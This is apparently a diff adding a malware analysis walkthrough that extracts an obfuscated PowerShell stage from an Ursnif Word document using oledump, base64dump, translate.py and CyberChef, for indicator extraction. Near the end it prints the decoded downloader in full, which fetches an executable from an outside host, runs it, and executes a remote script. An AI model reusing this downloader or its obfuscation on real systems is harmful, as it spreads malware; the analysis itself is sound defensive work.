 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 -------------------------------------------------------------------------------
       VBA FORM STRING IN 'info_08.15.doc' - OLE stream: u'Macros/aElSGoL2t/o'
@@ -1233,5 +257,220 @@ du poi(esp+8)
 
 until you get the final output of the macro code execution 
 
+====================================================================================================
+
+			URSNIF mal doc analysis and IOC extraction using following tools
+			MD5 (../ursnif.doc) = 209b1c2b0d1028456145ac1093dc1dec
+			https://www.fortinet.com/blog/threat-research/ursnif-variant-spreading-word-document.html
+
+Python script
+
+oledump.py --> oledump_V0_0_39
+base64dump.py --> wget http://didierstevens.com/files/software/base64dump_V0_0_11.zip
+translate.py --> wget https://raw.githubusercontent.com/DidierStevens/DidierStevensSuite/master/translate.py
+plugin --> plugin_stream_o.py
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+oledump tisocd$ python oledump.py ../ursnif.doc 
+
+  1:       114 '\x01CompObj'
+  2:      4096 '\x05DocumentSummaryInformation'
+  3:      4096 '\x05SummaryInformation'
+  4:      7115 '1Table'
+  5:     33394 'Data'
+  6:       478 'Macros/PROJECT'
+  7:        62 'Macros/PROJECTwm'
+  8: M    1472 'Macros/VBA/ThisDocument'
+  9:      3186 'Macros/VBA/_VBA_PROJECT'
+ 10:       819 'Macros/VBA/dir'
+ 11: m    1179 'Macros/VBA/ymwsrw'
+ 12:        97 'Macros/ymwsrw/\x01CompObj'
+ 13:       288 'Macros/ymwsrw/\x03VBFrame'
+ 14:       174 'Macros/ymwsrw/f'
+ 15:      2336 'Macros/ymwsrw/o'
+ 16:       306 'MsoDataStore/\xc3\x86\xc3\x97\xc3\x8b2\xc3\x88TPX3\xc3\x94W\xc3\x94\xc3\x8eI\xc3\x91\xc3\x82\xc3\x8e\xc3\x9e\xc3\x85YK\xc3\x90==/Item'
+ 17:       341 'MsoDataStore/\xc3\x86\xc3\x97\xc3\x8b2\xc3\x88TPX3\xc3\x94W\xc3\x94\xc3\x8eI\xc3\x91\xc3\x82\xc3\x8e\xc3\x9e\xc3\x85YK\xc3\x90==/Properties'
+ 18:      4096 'WordDocument'
+ 
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ Stream 12-15 contains forms properties ending with /o
+ 
+ Look into the stream 15 which has 2336 byte size
+ 
+ $ python oledump.py -s 15 ../ursnif.doc 
+ 
+00000000: 00 02 58 08 01 01 40 80  00 00 00 00 1B 48 80 2C  ..X...@......H.,
+00000010: 40 08 00 80 EC 09 00 00  7B 02 00 00 49 41 41 6F  @.......{...IAAo
+00000020: 41 43 41 41 4C 67 41 6F  41 43 63 41 62 67 42 46  ACAALgAoACcAbgBF
+00000030: 41 48 63 41 4A 77 41 72  41 43 63 41 4C 51 42 50  AHcAJwArACcALQBP
+00000040: 41 45 49 41 4A 77 41 72  41 43 63 41 61 67 41 6E  AEIAJwArACcAagAn
+00000050: 41 43 73 41 4A 77 42 6C  41 47 4D 41 64 41 41 6E  ACsAJwBlAGMAdAAn
+00000060: 41 43 6B 41 49 41 41 67  41 46 4D 41 57 51 42 54  ACkAIAAgAFMAWQBT
 
 
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ Upon using the plugin stream
+ 
+  python oledump.py -p plugin_stream_o ../ursnif.doc 
+  
+  1:       114 '\x01CompObj'
+  2:      4096 '\x05DocumentSummaryInformation'
+  3:      4096 '\x05SummaryInformation'
+  4:      7115 '1Table'
+  5:     33394 'Data'
+  6:       478 'Macros/PROJECT'
+  7:        62 'Macros/PROJECTwm'
+  8: M    1472 'Macros/VBA/ThisDocument'
+  9:      3186 'Macros/VBA/_VBA_PROJECT'
+ 10:       819 'Macros/VBA/dir'
+ 11: m    1179 'Macros/VBA/ymwsrw'
+ 12:        97 'Macros/ymwsrw/\x01CompObj'
+ 13:       288 'Macros/ymwsrw/\x03VBFrame'
+ 14:       174 'Macros/ymwsrw/f'
+ 15:      2336 'Macros/ymwsrw/o'
+               Plugin: UserForm /o plugin 
+                 IAAoACAALgAoACcAbgBFAHcAJwArACcALQBPAEIAJwArACcAagAnACsAJwBlAGMAdAAnACkAIAAgAFMAWQBTAFQAYAB
+		 lAG0AYAAuAGkAbwBgAC4AQwBPAE0AUABSAGAARQBgAHMAUwBpAE8AYABOAC4AZABlAGYAbABBAFQAZQBgAFMAVABSAE
+		 UAQQBtACgAWwBzAHkAUwB0AGUAbQAuAEkATwAuAE0ARQBNAE8AcgBZAHMAdAByAGUAQQBtAF0AWwBzAFkAUwBUAGUATQ
+		 AuAEMATwBOAFYAZQByAFQAXQA6ADoARgBSAG8ATQBCAGEAcwBlADYANABzAHQAcgBpAG4ARwAoACcAVABaAEQAZABUADQA
+		 TQB3AEYATQBYAGYAVABmAHcAZgArAG8AQQBwAFoASwA2ADQAagAyAHcAQwBJAGMAYQBNAFoAUwBFAHUAYgBOAG0ASABtAE
+		 sAagBKAFcA
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Now we can use base64dump to decode the encoded string. Filter the string with greater than 20 bytes. As you can see stream 11 
+contains greater the 20 bytes also starts with the powershell encoded strings
+
+$ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py 
+
+ID  Size    Encoded          Decoded          MD5 decoded                     
+--  ----    -------          -------          -----------                     
+ 1:       4 4096             ?Oz              fc2bdc3ec732a8dfb3c85dc95fb8fbb7
+ 2:       4 4096             ?Oz              fc2bdc3ec732a8dfb3c85dc95fb8fbb7
+ 3:       4 7115             ?]y              0f0577f7f7f372498bffc336439a6a19
+ 4:       4 Data             .?Z              46f0f52cf17af28bc6acb964533500fc
+ 5:      16 Macros/PROJECTwm 1?+???D?D.<&     a7e5ac3cf518604f33df8e1840c9932a
+ 6:       4 1472             ׎?              d2eb82eab07b3ed5033a329b4308ec3a
+ 7:       4 3186             ?_:              9b55140d319c9b99d9a665a33e77d3b5
+ 8:       4 1179             ?^?              ca08f43227f00f92d76b382929d35703
+ 9:       4 2336             ?}?              e4535fc93d75206cbcfd6be2838fde0a
+10:       8 UserForm         Rǫ.??           a93bcec7124c78a1f2601aceb839ca3e
+11:    2112 IAAoACAALgAoACcA  .(. ...(.'.n.E. 6c10d34554df7015670818b6d4daf9e3
+12:       8 72C24DD5         ?`??0?           c684d85d66708ad4e19a4d470a718101
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+$ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20
+ID  Size    Encoded          Decoded          MD5 decoded                     
+--  ----    -------          -------          -----------                     
+ 1:    2112 IAAoACAALgAoACcA  .(. ...(.'.n.E. 6c10d34554df7015670818b6d4daf9e3
+ 
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ 
+ Selecting the stream one from above and perform ascii dump
+ 
+ $ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20 -s 1 -a
+ 
+00000000: 20 00 28 00 20 00 2E 00  28 00 27 00 6E 00 45 00   .(. ...(.'.n.E.
+00000010: 77 00 27 00 2B 00 27 00  2D 00 4F 00 42 00 27 00  w.'.+.'.-.O.B.'.
+00000020: 2B 00 27 00 6A 00 27 00  2B 00 27 00 65 00 63 00  +.'.j.'.+.'.e.c.
+00000030: 74 00 27 00 29 00 20 00  20 00 53 00 59 00 53 00  t.'.). . .S.Y.S.
+00000040: 54 00 60 00 65 00 6D 00  60 00 2E 00 69 00 6F 00  T.`.e.m.`...i.o.
+00000050: 60 00 2E 00 43 00 4F 00  4D 00 50 00 52 00 60 00  `...C.O.M.P.R.`.
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Remove the dots by converting the asscii to utf16
+
+$ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20 -s 1 -t utf16
+
+ ( .('nEw'+'-OB'+'j'+'ect')  SYST`em`.io`.COMPR`E`sSiO`N.deflATe`STREAm([syStem.IO.MEMOrYstreAm][sYSTeM.CONVerT]::
+ FRoMBase64strinG('TZDdT4MwFMXfTfwf+oApZK64j2wCIcaMZSEubNmHmKjJWC3QDdoK3RgS/ncx2dSXe+/DOSfndxW3dEXwtAQ2gDhln89HaClr
+ UQjftxXCjuYhJ5nIeEgT0oJvsKWcDS2IyIk0Yt4PjfWHjVTIYAuSos2btd0RLKEGPLJZbZBPtpvRlBJvZSnHw8KZPX6NbBhLKUxdZ2If9rplyhnFAcI
+ 81fOy4HoYcV4gEYuHxN415z2KTglEuUioVOEN1KyQZyTAsaq4c5H2PeoDysBvvlbJrKzO7ZDDCy/hgRO6yfjPcAvOqJrlhkBVG4YJkW23AZCkGWlDcFG
+ gZOxNZAzaEQFdYzjUQPXq0CBiPJcU52iecUzy/N00l6tgIdXf5G3Tcm/VNQ4kjqu6toA7flH/FWPTWeAsZeaySL08pXNnoI4xQJ1BHw0NvffzCKhp1vXV
+ Nw==') ,[sYsTem.io.cOMpReSsiON.CompressIONMODE]::DECompreSS )|&('f'+'ore'+'acH'){ &('NEW-ob'+'J'+'EcT') 
+ i`o.`S`TreamREADER($_,[sySTem.TExT.ENcodInG]::asCii) }|.('ForEa'+'C'+'H'){$_.readtoend() } ) |.('I'+'E' + 'X')
+
+Compressed base64 encoded strings
+
+TZDdT4MwFMXfTfwf+oApZK64j2wCIcaMZSEubNmHmKjJWC3QDdoK3RgS/ncx2dSXe+/DOSfndxW3dEXwtAQ2gDhln89HaClr
+ UQjftxXCjuYhJ5nIeEgT0oJvsKWcDS2IyIk0Yt4PjfWHjVTIYAuSos2btd0RLKEGPLJZbZBPtpvRlBJvZSnHw8KZPX6NbBhLKUxdZ2If9rplyhnFAcI
+ 81fOy4HoYcV4gEYuHxN415z2KTglEuUioVOEN1KyQZyTAsaq4c5H2PeoDysBvvlbJrKzO7ZDDCy/hgRO6yfjPcAvOqJrlhkBVG4YJkW23AZCkGWlDcFG
+ gZOxNZAzaEQFdYzjUQPXq0CBiPJcU52iecUzy/N00l6tgIdXf5G3Tcm/VNQ4kjqu6toA7flH/FWPTWeAsZeaySL08pXNnoI4xQJ1BHw0NvffzCKhp1vXV
+ Nw==
+ 
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ 
+PIPE the above base64 to base64dump
+
+ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20 -s 1 -t utf16 | ./base64dump.py 
+ 
+ID  Size    Encoded          Decoded          MD5 decoded                     
+--  ----    -------          -------          -----------                     
+ 1:       4 SYST             I??              b84f1d3fb14c5a1307a188b8e4732131
+ 2:       4 sSiO             ?(?              330cdd935f91947fb47c8a2cb1925adc
+ 3:      12 MEMOrYstreAm     0C.??-??&        5e4cec61ea2be09a6561fe98c573f1e2
+ 4:      16 FRoMBase64strinG ....?.?-?)?     6e21956a4962ee3d48600b4b3623e73e
+ 5:     448 TZDdT4MwFMXfTfwf M??O?0.??M?.??)d 5c06b33437f0739de1a4c8ee277e3caa
+ 6:       4 TExT             LLS              090084d1ca90cec9865c7ecf79cca12d
+ 7:       8 ENcodInG         .?(t??           486dd5e82b48868be7b5aa87ad187c7a
+ 
+ Stream 5 starts with the base64 strings
+ 
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ 
+ > 40 btyes
+ 
+ $ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20 -s 1 -t utf16 | ./base64dump.py -n 40
+ 
+ID  Size    Encoded          Decoded          MD5 decoded                     
+--  ----    -------          -------          -----------                     
+ 1:     448 TZDdT4MwFMXfTfwf M??O?0.??M?.??)d 5c06b33437f0739de1a4c8ee277e3caa
+ 
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ 
+ $ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20 -s 1 -t utf16 | ./base64dump.py -n 40 -s 1 -a
+
+00000000: 4D 90 DD 4F 83 30 14 C5  DF 4D FC 1F FA 80 29 64  M..O.0...M...?)d
+00000010: AE B8 8F 6C 02 21 C6 8C  65 21 2E 6C D9 87 98 A8  ...l.!..e!.l....
+00000020: C9 58 2D D0 0D DA 0A DD  18 12 FE 77 31 D9 D4 97  .X-........w1...
+00000030: 7B EF C3 39 27 E7 77 15  B7 74 45 F0 B4 04 36 80  {..9'.w..tE...6?
+00000040: 38 65 9F CF 47 68 29 6B  51 08 DF B7 15 C2 8E E6  8e..Gh)kQ.......
+00000050: 21 27 99 C8 78 48 13 D2  82 6F B0 A5 9C 0D 2D 88  !'..xH...o....-.
+00000060: C8 89 34 62 DE 0F 8D F5  87 8D 54 C8 60 0B 92 A2  ..4b......T.`...
+00000070: CD 9B B5 DD 11 2C A1 06  3C B2 59 6D 90 4F B6 9B  .....,..<.Ym.O..
+00000080: D1 94 12 6F 65 29 C7 C3  C2 99 3D 7E 8D 6C 18 4B  ...oe)....=~.l.
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+$ python oledump.py -p plugin_stream_o.py ../ursnif.doc | ./base64dump.py -n 20 -s 1 -t utf16 | 
+./base64dump.py -n 40 -s 1 -a -d | ./translate.py -f ZlibRawD
+
+$IyIpaKS = 'cmnqVv';$UpwpWW=$env:userprofile+'\'+$IyIpaKS+'.exe';$o4f9Ud=.('n'+'ew-o'+'bject') Ne`T`.Web`CLieNT;
+$vuRDOAzC='http://npkf32ymonica.com/sywo/fgoow.php?l=joow8.gxl'.split('%');
+foreach($IPpm4NiW in $vuRDOAzC){try{$o4f9Ud.DowNloaDfIlE($IPpm4NiW, $UpwpWW);
+If ((.('Get-I'+'te'+'m') $UpwpWW).lENGth -ge 2977) {[Diagnostics.Process]::STaRt($UpwpWW);break;}}catch{}}; 
+IEX($o4f9Ud.DownLOaDStrIng('http://109[.]196.164.79/3.php'));
+
+ Finally the above IOC has been extracted using translate.py 
+ 
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ 
+ Alternate solution use cyber chef with 
+ 
+ From base64 --> Raw Inflate (Adaptive)
+ 
+ Input
+ 
+ TZDdT4MwFMXfTfwf+oApZK64j2wCIcaMZSEubNmHmKjJWC3QDdoK3RgS/ncx2dSXe+/DOSfndxW3dEXwtAQ2gDhln89HaClr
+UQjftxXCjuYhJ5nIeEgT0oJvsKWcDS2IyIk0Yt4PjfWHjVTIYAuSos2btd0RLKEGPLJZbZBPtpvRlBJvZSnHw8KZPX6NbBhLK
+UxdZ2If9rplyhnFAcI81fOy4HoYcV4gEYuHxN415z2KTglEuUioVOEN1KyQZyTAsaq4c5H2PeoDysBvvlbJrKzO7ZDDCy/hgR
+O6yfjPcAvOqJrlhkBVG4YJkW23AZCkGWlDcFGgZOxNZAzaEQFdYzjUQPXq0CBiPJcU52iecUzy/N00l6tgIdXf5G3Tcm/
+VNQ4kjqu6toA7flH/FWPTWeAsZeaySL08pXNnoI4xQJ1BHw0NvffzCKhp1vXVNw==
+ 
+ $IyIpaKS = 'cmnqVv';$UpwpWW=$env:userprofile+'\'+$IyIpaKS+'.exe';$o4f9Ud=.('n'+'ew-o'+'bject') 
+ Ne`T`.Web`CLieNT;$vuRDOAzC='http://npkf32ymonica.com/sywo/fgoow.php?l=joow8.gxl'.split('%');
+ foreach($IPpm4NiW in $vuRDOAzC){try{$o4f9Ud.DowNloaDfIlE($IPpm4NiW, $UpwpWW);If ((.('Get-I'+'te'+'m')
+ $UpwpWW).lENGth -ge 2977) {[Diagnostics.Process]::STaRt($UpwpWW);break;}}catch{}};
+ IEX($o4f9Ud.DownLOaDStrIng('http://109[.]196.164.79/3.php'));
